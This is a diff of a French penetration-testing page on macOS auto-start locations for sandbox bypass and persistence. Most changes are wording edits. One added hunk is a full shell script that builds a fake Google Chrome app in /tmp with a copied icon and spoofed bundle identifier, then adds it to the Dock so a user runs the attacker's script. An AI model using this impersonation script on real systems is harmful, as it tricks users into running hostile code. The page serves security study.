@@ -17,7 +17,7 @@ Cette section est largement basée sur la série de blogs [**Au-delà des bons v
 ## Contournement de la sandbox
 
 {% hint style="success" %}
-Ici, vous pouvez trouver des emplacements de démarrage utiles pour **contourner la sandbox** qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action** très **courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'une sandbox sans avoir besoin de privilèges root.
+Ici, vous pouvez trouver des emplacements de démarrage utiles pour **contourner la sandbox** qui vous permettent d'exécuter simplement quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action** très **courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'une sandbox sans avoir besoin de privilèges root.
 {% endhint %}
 
 ### Launchd
@@ -39,9 +39,9 @@ Ici, vous pouvez trouver des emplacements de démarrage utiles pour **contourner
 * Déclencheur : Redémarrage
 * Nécessite les privilèges root
 * **`~/Library/LaunchAgents`**
-* Déclencheur : Connexion
+* Déclencheur : Reconnexion
 * **`~/Library/LaunchDemons`**
-* Déclencheur : Connexion
+* Déclencheur : Reconnexion
 
 #### Description et exploitation
 
@@ -77,7 +77,7 @@ La **principale différence entre les agents et les daemons est que les agents s
 </dict>
 </plist>
 ```
-Il y a des cas où un **agent doit être exécuté avant la connexion de l'utilisateur**, on les appelle des **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).
+Il existe des cas où un **agent doit être exécuté avant la connexion de l'utilisateur**, on les appelle des **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).
 
 {% hint style="info" %}
 Les nouveaux fichiers de configuration des démons ou des agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>`. Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant, ces fichiers plist ne seront pas automatiquement chargés après le redémarrage).\
@@ -119,7 +119,7 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 
 #### Description et exploitation
 
-Les fichiers de démarrage du shell sont exécutés lorsque notre environnement de shell comme `zsh` ou `bash` est en train de **démarrer**. De nos jours, macOS utilise par défaut `/bin/zsh`, et **chaque fois que nous ouvrons `Terminal` ou nous connectons en SSH** sur l'appareil, c'est l'environnement de shell dans lequel nous sommes placés. `bash` et `sh` sont toujours disponibles, mais ils doivent être spécifiquement démarrés.
+Les fichiers de démarrage du shell sont exécutés lorsque notre environnement shell comme `zsh` ou `bash` est en train de **démarrer**. De nos jours, macOS utilise par défaut `/bin/zsh`, et **chaque fois que nous ouvrons `Terminal` ou nous connectons en SSH** sur l'appareil, c'est l'environnement shell dans lequel nous sommes placés. `bash` et `sh` sont toujours disponibles, mais ils doivent être spécifiquement démarrés.
 
 La page de manuel de zsh, que nous pouvons lire avec **`man zsh`**, contient une longue description des fichiers de démarrage.
 ```bash
@@ -301,7 +301,7 @@ Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner l
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* Utile pour contourner la sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
 * Cependant, vous devez être capable d'exécuter le binaire `crontab`
 * Ou être root
 
@@ -309,11 +309,11 @@ Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner l
 
 * **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
 * Accès en écriture directe nécessitant les droits root. Aucun droit root requis si vous pouvez exécuter `crontab <fichier>`
-* **Déclencheur**: Dépend de la tâche cron
+* **Déclencheur** : Dépend de la tâche cron
 
 #### Description et exploitation
 
-Listez les tâches cron de l'**utilisateur actuel** avec:
+Listez les tâches cron de l'**utilisateur actuel** avec :
 ```bash
 crontab -l
 ```
@@ -731,11 +731,64 @@ killall Dock
 ```
 {% endcode %}
 
+En utilisant de l'**ingénierie sociale**, vous pourriez **vous faire passer par exemple pour Google Chrome** dans le dock et exécuter réellement votre propre script :
+```bash
+#!/bin/sh
+
+# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
+
+rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null
+
+# Create App structure
+mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
+mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
+
+# Payload to execute
+echo '#!/bin/sh
+open /Applications/Google\ Chrome.app/ &
+touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+# Info.plist
+cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
+</dict>
+</plist>
+EOF
+
+# Copy icon from Google Chrome
+cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns
+
+# Add to Dock
+defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
+killall Dock
+```
 ### Sélecteurs de couleurs
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
 
-* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
+* Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Une action très spécifique doit se produire
 * Vous vous retrouverez dans un autre sandbox
 
@@ -768,8 +821,8 @@ Notez que le binaire chargé avec votre bibliothèque a un **sandbox très restr
 
 ### Plugins de synchronisation Finder
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
-**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
+**Article**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
+**Article**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
 
 * Utile pour contourner le sandbox : **Non, car vous devez exécuter votre propre application**
 
@@ -1179,7 +1232,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.
 #### Emplacement
 
 * **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
-* Nécessite les droits d'administrateur
+* Nécessite les droits root
 * **Déclencheur**: Avec XQuartz
 
 #### Description & Exploit
@@ -1189,7 +1242,7 @@ XQuartz n'est **plus installé dans macOS**, donc si vous voulez plus d'informat
 ### ~~kext~~
 
 {% hint style="danger" %}
-Il est si compliqué d'installer un kext même en tant qu'administrateur que je ne le considérerai pas comme une échappatoire aux sandbox ou même pour la persistance (à moins que vous ayez une faille)
+Il est si compliqué d'installer un kext même en tant que root que je ne le considérerai pas pour échapper aux sandbox ou même pour la persistance (à moins que vous ayez une exploit)
 {% endhint %}
 
 #### Emplacement
